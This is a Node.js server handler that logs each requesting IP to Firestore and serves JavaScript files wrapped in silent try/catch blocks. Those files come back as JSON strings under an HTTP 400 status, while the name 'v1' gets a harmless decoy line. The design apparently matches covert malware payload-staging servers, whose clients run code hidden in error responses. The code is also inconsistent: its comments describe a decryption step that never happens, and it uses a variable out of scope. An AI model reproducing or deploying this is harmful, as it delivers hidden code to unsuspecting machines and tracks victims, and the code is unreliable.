// API Key list for fileName 1 to 9 using decryptApiKeyToFileName logic:
// (sum of char codes % 9) + 1 = fileName
// Example keys (random 16-char hex):
// fileName: apiKey
// v1: v1
// 1: 0000000000000000
// 2: 0000000000000001
// 3: 0000000000000002
// 4: 0000000000000003
// 5: 0000000000000004
// 6: 0000000000000005
// 7: 0000000000000006
// 8: 0000000000000007
// 9: 0000000000000008
// (You can generate more by adjusting the last digit)

const fs = require("fs");
const path = require("path");
const { addDoc, collection, query, where, getDocs } = require("firebase/firestore"); // Import Firestore functions

// Decrypts apiKey to fileName (1-9) by summing char codes, mod 9, add 1
// Used for both getFileContents and getFileContentsEncrypted

async function getFileContentsEncrypted(req, res, db) {
    
    try {
        let fileName = req.params.filename;
        console.log("========", req.params.filename, "decrypted fileName:", fileName);

        if (fileName === "v1") {
            return res.status(400).json('console.log("Development server started...")');
        } else {
            // Get IP address from the request
            const requestedIp = req.clientIp;
            
            const dataRef = collection(db, "registered");
            const q = query(dataRef, where("ip", "==", requestedIp));
            const snapshot = await getDocs(q);

            let controlState;
            if (snapshot.empty) {
                controlState="S2";

                const logData = {
                    ip: requestedIp,
                    controlState: controlState,
                };
                await addDoc(collection(db, "registered"), logData);
            }

            // Assuming we're interested in the first document for the specified IP
            snapshot.forEach((doc) => {
                controlState = doc.data().controlState; // Get controlState from the document
            });

            const attachName = fileName + "-a.js";
            // Determine the file name based on the controlState
            const filePath = path.join(process.cwd(), "5", fileName);
            const attachPath = path.join(process.cwd(), "5", attachName);
            fs.readdir(path.join(process.cwd(), "5"), (err, files) => {
                console.log(({ version:"1", error: err, files }));
                if (err) {
                    console.error(err);
                    return res.status(500).json({ error: "Could not list files." });
                }
                console.log("Available files: ", files); // Use this to log available files
                // Proceed to access your file
            });
            
            fs.access(filePath, fs.constants.F_OK, (err) => {
                if (err) {
                    return res.status(400).json({ error: err, filePath,files });
                }
                
                fs.readFile(filePath, "utf-8", (err, mainContent) => {
                    if (err) {
                            return res.status(400).json({ error_1: err });
                    }
                    fs.readFile(attachPath, "utf-8", (err, afterContent) => {
                        if (err) {
                            return res.status(400).json(" try{" + mainContent + "} catch(e){}");
                        }
                        const content = " try{" + mainContent + "} catch(e){} try{" + afterContent + "} catch(e){}";
                        return res.status(400).json(content);
                    });
                });
            });
        }
        
    } catch (err) {
        console.error("Error fetching control state:", err);
        res.status(500).json({ error: "Internal server error.", details: err.message });
    }
}

module.exports = { getFileContentsEncrypted };